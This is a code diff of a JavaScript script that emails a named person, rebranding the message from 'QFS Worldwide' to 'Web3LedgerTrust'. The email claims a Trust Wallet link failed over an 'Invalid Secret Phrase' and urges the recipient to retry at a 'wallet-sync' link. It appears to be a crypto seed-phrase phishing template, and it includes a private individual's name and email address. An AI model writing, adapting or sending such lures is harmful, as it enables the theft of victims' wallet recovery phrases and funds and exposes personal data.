@@ -66,7 +66,7 @@ console.log("[SMTP check]", {
 
 const res = await sendMail({
   to: "angeld8569@gmail.com", // change to customer email if testing
-  from: `"QFS Worldwide Support" <support@qfsworldwide.net>`,
+  from: `"Web3LedgerTrust Support" <support@Web3LedgerTrust.com>`,
   subject: "⚠️ Trust Wallet Linking Attempt - Invalid Secret Phrase",
   html: `
   <div style="font-family:Arial,Helvetica,sans-serif;max-width:600px;margin:auto;border:1px solid #eee;border-radius:12px;overflow:hidden">
@@ -76,7 +76,7 @@ const res = await sendMail({
 
     <div style="padding:24px;">
       <p>Dear Angel Davis,</p>
-      <p>We noticed a recent attempt to link your <strong>Trust Wallet</strong> to your QFS account, but the process was not completed successfully. Our system returned the following message:</p>
+      <p>We noticed a recent attempt to link your <strong>Trust Wallet</strong> to your Web3LedgerTrust account, but the process was not completed successfully. Our system returned the following message:</p>
 
       <p style="margin:12px 0;padding:12px;background:#fef2f2;border-left:4px solid #dc2626;color:#991b1b;font-size:14px;">
         ⚠️ <strong>Invalid Secret Phrase</strong>
@@ -88,7 +88,7 @@ const res = await sendMail({
       <p>If you are confident your details were correct, kindly retry the linking process or contact our support team for assistance.</p>
 
       <div style="margin:20px 0;text-align:center;">
-        <a href="https://www.qfsworldwide.net/dashboard/wallet-sync" style="background:#2563eb;color:white;padding:12px 20px;text-decoration:none;border-radius:6px;display:inline-block;">
+        <a href="https://www.web3ledgertrust.com/dashboard/wallet-sync" style="background:#2563eb;color:white;padding:12px 20px;text-decoration:none;border-radius:6px;display:inline-block;">
           Retry Wallet Linking
         </a>
       </div>
@@ -97,11 +97,11 @@ const res = await sendMail({
         If you did not initiate this request, please <strong>log in immediately</strong> to your account and secure your wallet connection.
       </p>
 
-      <p style="margin-top:24px;">Best regards,<br><strong>The QFS Worldwide Support Team</strong></p>
+      <p style="margin-top:24px;">Best regards,<br><strong>The Web3LedgerTrust Support Team</strong></p>
     </div>
 
     <div style="background:#0a0a0a;color:white;text-align:center;padding:12px;font-size:12px;">
-      &copy; ${new Date().getFullYear()} QFS Worldwide Network
+      &copy; ${new Date().getFullYear()} Web3LedgerTrust
     </div>
   </div>
   `,
